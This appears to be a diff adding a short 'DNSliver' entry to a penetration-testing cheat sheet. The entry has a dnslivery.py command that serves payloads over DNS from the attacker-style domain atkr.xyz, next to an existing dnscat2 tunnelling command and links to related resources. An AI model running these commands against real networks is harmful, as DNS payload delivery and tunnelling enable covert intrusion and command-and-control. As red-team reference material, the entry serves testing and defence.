@@ -1499,6 +1499,18 @@ From Win10
 ```
 dnscat-2-v0.07-client-win32.exe tunnel.com
 ```
+#### DNSliver
+
+Print, save, and exec functionality via DNS
+
+```
+./dnslivery.py eth0 <ns record>.atkr.xyz <A record>.atkr.xyz -p /tmp/dnswww -v
+```
+
+##### Resources
+- https://github.com/no0be/DNSlivery
+- https://medium.com/@maarten.goet/protecting-against-malicious-payloads-over-dns-using-azure-sentinel-b16b41de52fd
+- https://www.ired.team/offensive-security/exfiltration/payload-delivery-via-dns-using-invoke-powercloud
 
 #### Msf Socks Proxy
 
